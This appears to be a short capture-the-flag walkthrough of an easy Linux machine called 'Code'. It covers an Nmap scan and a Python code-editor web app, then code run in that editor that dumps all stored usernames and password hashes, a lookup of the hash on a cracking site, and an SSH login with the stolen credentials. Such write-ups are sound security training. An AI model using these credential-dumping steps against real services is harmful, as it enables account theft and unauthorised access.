# Code - Linux(Easy)

## Summary

## Enumeration
Begin enumeration on the host by running an Nmap scan. 

```
sudo nmap -sC -sV <target IP>

-sC Default Scripts
-sV Version Scan
```

![nmap](Images/nmap.png)

We can see that port 22 and 5000 are open.

Lookng at port 5000 and it appears to be hosting a http web server. We can browse to this site successfully

```
http://<target IP>:5000
```

This site appears to be some sort of python code editor with a login and register page.

![webPage](Images/webPage.png)

Next, we register an account and login. We can now run/save python code.
From testing we can see that the import function is blocked. This will exploitation more difficult.

We can use the below code to print out the current sessions username and password.

```
print([u.username for u in db.session.query(User).all()])

print([u.password for u in db.session.query(User).all()])
```

![codePrint](Images/codePrint.png)

We now have a username and password hash. We can use a site like crackstation.net to check if this password hash has already been cracked.
This password hash has already been cracked. Now, we can ssh into the box with the acquired credentials

```
ssh martin@<target IP>
```
We have sucessfully logged into the box.
